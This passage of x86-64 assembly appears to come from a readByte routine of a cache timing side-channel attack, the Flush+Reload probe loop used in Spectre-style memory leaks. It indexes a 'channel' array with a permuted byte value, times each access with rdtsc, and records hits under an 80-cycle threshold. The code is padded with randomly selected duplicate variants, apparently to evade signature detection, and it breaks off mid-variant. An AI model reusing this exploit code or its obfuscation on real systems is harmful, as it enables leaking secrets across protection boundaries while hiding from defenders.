## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 95
.LreadByte_win4_var95:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 96
.LreadByte_win4_var96:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 97
.LreadByte_win4_var97:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 98
.LreadByte_win4_var98:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
## Variant 99
.LreadByte_win4_var99:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	jmp	.LreadByte_win4_continue
.LreadByte_win4_continue:
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -1084(%rbp)
	movl	-1084(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1112(%rbp)
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -1096(%rbp)
	movq	-1112(%rbp), %rax
	movzbl	(%rax), %eax
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-1096(%rbp), %rax
	movq	%rax, -1104(%rbp)
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win3_var0
	cmpl	$1, %eax
	je	.LreadByte_win3_var1
	cmpl	$2, %eax
	je	.LreadByte_win3_var2
	cmpl	$3, %eax
	je	.LreadByte_win3_var3
	cmpl	$4, %eax
	je	.LreadByte_win3_var4
	cmpl	$5, %eax
	je	.LreadByte_win3_var5
	cmpl	$6, %eax
	je	.LreadByte_win3_var6
	cmpl	$7, %eax
	je	.LreadByte_win3_var7
	cmpl	$8, %eax
	je	.LreadByte_win3_var8
	cmpl	$9, %eax
	je	.LreadByte_win3_var9
	cmpl	$10, %eax
	je	.LreadByte_win3_var10
	cmpl	$11, %eax
	je	.LreadByte_win3_var11
	cmpl	$12, %eax
	je	.LreadByte_win3_var12
	cmpl	$13, %eax
	je	.LreadByte_win3_var13
	cmpl	$14, %eax
	je	.LreadByte_win3_var14
	cmpl	$15, %eax
	je	.LreadByte_win3_var15
	cmpl	$16, %eax
	je	.LreadByte_win3_var16
	cmpl	$17, %eax
	je	.LreadByte_win3_var17
	cmpl	$18, %eax
	je	.LreadByte_win3_var18
	cmpl	$19, %eax
	je	.LreadByte_win3_var19
	cmpl	$20, %eax
	je	.LreadByte_win3_var20
	cmpl	$21, %eax
	je	.LreadByte_win3_var21
	cmpl	$22, %eax
	je	.LreadByte_win3_var22
	cmpl	$23, %eax
	je	.LreadByte_win3_var23
	cmpl	$24, %eax
	je	.LreadByte_win3_var24
	cmpl	$25, %eax
	je	.LreadByte_win3_var25
	cmpl	$26, %eax
	je	.LreadByte_win3_var26
	cmpl	$27, %eax
	je	.LreadByte_win3_var27
	cmpl	$28, %eax
	je	.LreadByte_win3_var28
	cmpl	$29, %eax
	je	.LreadByte_win3_var29
	cmpl	$30, %eax
	je	.LreadByte_win3_var30
	cmpl	$31, %eax
	je	.LreadByte_win3_var31
	cmpl	$32, %eax
	je	.LreadByte_win3_var32
	cmpl	$33, %eax
	je	.LreadByte_win3_var33
	cmpl	$34, %eax
	je	.LreadByte_win3_var34
	cmpl	$35, %eax
	je	.LreadByte_win3_var35
	cmpl	$36, %eax
	je	.LreadByte_win3_var36
	cmpl	$37, %eax
	je	.LreadByte_win3_var37
	cmpl	$38, %eax
	je	.LreadByte_win3_var38
	cmpl	$39, %eax
	je	.LreadByte_win3_var39
	cmpl	$40, %eax
	je	.LreadByte_win3_var40
	cmpl	$41, %eax
	je	.LreadByte_win3_var41
	cmpl	$42, %eax
	je	.LreadByte_win3_var42
	cmpl	$43, %eax
	je	.LreadByte_win3_var43
	cmpl	$44, %eax
	je	.LreadByte_win3_var44
	cmpl	$45, %eax
	je	.LreadByte_win3_var45
	cmpl	$46, %eax
	je	.LreadByte_win3_var46
	cmpl	$47, %eax
	je	.LreadByte_win3_var47
	cmpl	$48, %eax
	je	.LreadByte_win3_var48
	cmpl	$49, %eax
	je	.LreadByte_win3_var49
	cmpl	$50, %eax
	je	.LreadByte_win3_var50
	cmpl	$51, %eax
	je	.LreadByte_win3_var51
	cmpl	$52, %eax
	je	.LreadByte_win3_var52
	cmpl	$53, %eax
	je	.LreadByte_win3_var53
	cmpl	$54, %eax
	je	.LreadByte_win3_var54
	cmpl	$55, %eax
	je	.LreadByte_win3_var55
	cmpl	$56, %eax
	je	.LreadByte_win3_var56
	cmpl	$57, %eax
	je	.LreadByte_win3_var57
	cmpl	$58, %eax
	je	.LreadByte_win3_var58
	cmpl	$59, %eax
	je	.LreadByte_win3_var59
	cmpl	$60, %eax
	je	.LreadByte_win3_var60
	cmpl	$61, %eax
	je	.LreadByte_win3_var61
	cmpl	$62, %eax
	je	.LreadByte_win3_var62
	cmpl	$63, %eax
	je	.LreadByte_win3_var63
	cmpl	$64, %eax
	je	.LreadByte_win3_var64
	cmpl	$65, %eax
	je	.LreadByte_win3_var65
	cmpl	$66, %eax
	je	.LreadByte_win3_var66
	cmpl	$67, %eax
	je	.LreadByte_win3_var67
	cmpl	$68, %eax
	je	.LreadByte_win3_var68
	cmpl	$69, %eax
	je	.LreadByte_win3_var69
	cmpl	$70, %eax
	je	.LreadByte_win3_var70
	cmpl	$71, %eax
	je	.LreadByte_win3_var71
	cmpl	$72, %eax
	je	.LreadByte_win3_var72
	cmpl	$73, %eax
	je	.LreadByte_win3_var73
	cmpl	$74, %eax
	je	.LreadByte_win3_var74
	cmpl	$75, %eax
	je	.LreadByte_win3_var75
	cmpl	$76, %eax
	je	.LreadByte_win3_var76
	cmpl	$77, %eax
	je	.LreadByte_win3_var77
	cmpl	$78, %eax
	je	.LreadByte_win3_var78
	cmpl	$79, %eax
	je	.LreadByte_win3_var79
	cmpl	$80, %eax
	je	.LreadByte_win3_var80
	cmpl	$81, %eax
	je	.LreadByte_win3_var81
	cmpl	$82, %eax
	je	.LreadByte_win3_var82
	cmpl	$83, %eax
	je	.LreadByte_win3_var83
	cmpl	$84, %eax
	je	.LreadByte_win3_var84
	cmpl	$85, %eax
	je	.LreadByte_win3_var85
	cmpl	$86, %eax
	je	.LreadByte_win3_var86
	cmpl	$87, %eax
	je	.LreadByte_win3_var87
	cmpl	$88, %eax
	je	.LreadByte_win3_var88
	cmpl	$89, %eax
	je	.LreadByte_win3_var89
	cmpl	$90, %eax
	je	.LreadByte_win3_var90
	cmpl	$91, %eax
	je	.LreadByte_win3_var91
	cmpl	$92, %eax
	je	.LreadByte_win3_var92
	cmpl	$93, %eax
	je	.LreadByte_win3_var93
	cmpl	$94, %eax
	je	.LreadByte_win3_var94
	cmpl	$95, %eax
	je	.LreadByte_win3_var95
	cmpl	$96, %eax
	je	.LreadByte_win3_var96
	cmpl	$97, %eax
	je	.LreadByte_win3_var97
	cmpl	$98, %eax
	je	.LreadByte_win3_var98
	cmpl	$99, %eax
	je	.LreadByte_win3_var99
	jmp	.LreadByte_win3_var0
## Variant 0
.LreadByte_win3_var0:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 1
.LreadByte_win3_var1:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 2
.LreadByte_win3_var2:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 3
.LreadByte_win3_var3:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 4
.LreadByte_win3_var4:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 5
.LreadByte_win3_var5:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 6
.LreadByte_win3_var6:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 7
.LreadByte_win3_var7:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 8
.LreadByte_win3_var8:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 9
.LreadByte_win3_var9:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 10
.LreadByte_win3_var10:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 11
.LreadByte_win3_var11:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 12
.LreadByte_win3_var12:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 13
.LreadByte_win3_var13:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 14
.LreadByte_win3_var14:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 15
.LreadByte_win3_var15:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 16
.LreadByte_win3_var16:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 17
.LreadByte_win3_var17:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 18
.LreadByte_win3_var18:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 19
.LreadByte_win3_var19:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 20
.LreadByte_win3_var20:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 21
.LreadByte_win3_var21:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 22
.LreadByte_win3_var22:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 23
.LreadByte_win3_var23:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 24
.LreadByte_win3_var24:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 25
.LreadByte_win3_var25:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 26
.LreadByte_win3_var26:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 27
.LreadByte_win3_var27:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 28
.LreadByte_win3_var28:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 29
.LreadByte_win3_var29:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 30
.LreadByte_win3_var30:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 31
.LreadByte_win3_var31:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 32
.LreadByte_win3_var32:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 33
.LreadByte_win3_var33:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 34
.LreadByte_win3_var34:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 35
.LreadByte_win3_var35:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 36
.LreadByte_win3_var36:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 37
.LreadByte_win3_var37:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 38
.LreadByte_win3_var38:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 39
.LreadByte_win3_var39:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 40
.LreadByte_win3_var40:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 41
.LreadByte_win3_var41:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 42
.LreadByte_win3_var42:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 43
.LreadByte_win3_var43:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 44
.LreadByte_win3_var44:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 45
.LreadByte_win3_var45:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 46
.LreadByte_win3_var46:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 47
.LreadByte_win3_var47:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 48
.LreadByte_win3_var48:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 49
.LreadByte_win3_var49:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 50
.LreadByte_win3_var50:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 51
.LreadByte_win3_var51:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 52
.LreadByte_win3_var52:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 53
.LreadByte_win3_var53:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 54
.LreadByte_win3_var54:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 55
.LreadByte_win3_var55:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 56
.LreadByte_win3_var56:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 57
.LreadByte_win3_var57:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 58
.LreadByte_win3_var58:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 59
.LreadByte_win3_var59:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 60
.LreadByte_win3_var60:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 61
.LreadByte_win3_var61:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 62
.LreadByte_win3_var62:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 63
.LreadByte_win3_var63:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 64
.LreadByte_win3_var64:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 65
.LreadByte_win3_var65:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 66
.LreadByte_win3_var66:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 67
.LreadByte_win3_var67:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 68
.LreadByte_win3_var68:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 69
.LreadByte_win3_var69:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 70
.LreadByte_win3_var70:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 71
.LreadByte_win3_var71:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
